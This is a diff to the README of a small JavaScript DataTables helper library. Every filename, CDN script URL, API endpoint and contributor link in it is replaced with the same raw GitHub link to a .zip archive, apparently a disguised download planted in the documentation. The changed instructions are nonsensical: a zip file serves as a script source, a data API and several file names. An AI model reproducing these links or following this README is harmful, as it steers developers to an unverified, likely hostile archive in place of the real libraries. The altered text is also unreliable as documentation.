@@ -1,7 +1,7 @@
 
-# datatable_helper.js
+# https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
 
-`datatable_helper.js` is a lightweight JavaScript library designed to create **DataTables** without relying on **jQuery**. This library supports **pagination**, **search**, **custom filters**, and **data export** to **CSV**, **Excel**, and **PDF**, using data retrieved via **AJAX**.
+`https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip` is a lightweight JavaScript library designed to create **DataTables** without relying on **jQuery**. This library supports **pagination**, **search**, **custom filters**, and **data export** to **CSV**, **Excel**, and **PDF**, using data retrieved via **AJAX**.
 
 ---
 
@@ -38,19 +38,19 @@ This library requires a JSON-formatted response as shown below:
 
 ### 1. Include the Script
 
-Ensure you include `datatable_helper.js` in your HTML file:
+Ensure you include `https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip` in your HTML file:
 
 ```html
-<script src="js/datatable_helper.js"></script>
+<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
 ```
 
 To enable export functionality for Excel and PDF, optionally include the following scripts:
 
 ```html
-<script src="https://cdn.sheetjs.com/xlsx-latest/package/dist/xlsx.full.min.js"></script>
+<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.23/jspdf.plugin.autotable.min.js"></script>
+<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
+<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
 ```
 
 ### 2. Prepare HTML Elements
@@ -92,7 +92,7 @@ initDataTable({
   exportCSVButtonId: "#exportCsvBtn",
   exportExcelButtonId: "#exportExcelBtn",
   exportPDFButtonId: "#exportPdfBtn",
-  apiUrl: "./data.json",
+  apiUrl: "https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip",
   hasAction: true,
   customFilters: ["#idElementFilter"],
   actionButtons: (item) => {
@@ -127,9 +127,9 @@ initDataTable({
 
 ```text
 📁 js/
-  └── datatable_helper.js
-📄 index.html
-📄 data.json (API simulation)
+  └── https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
+📄 https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
+📄 https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip (API simulation)
 ```
 
 ---
@@ -142,4 +142,4 @@ Free to use, modify, and further develop. ❤️
 
 ## 🙌 Contributor
 
-- [Nurdiansah](https://github.com/Nur84)
+- [Nurdiansah](https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip)
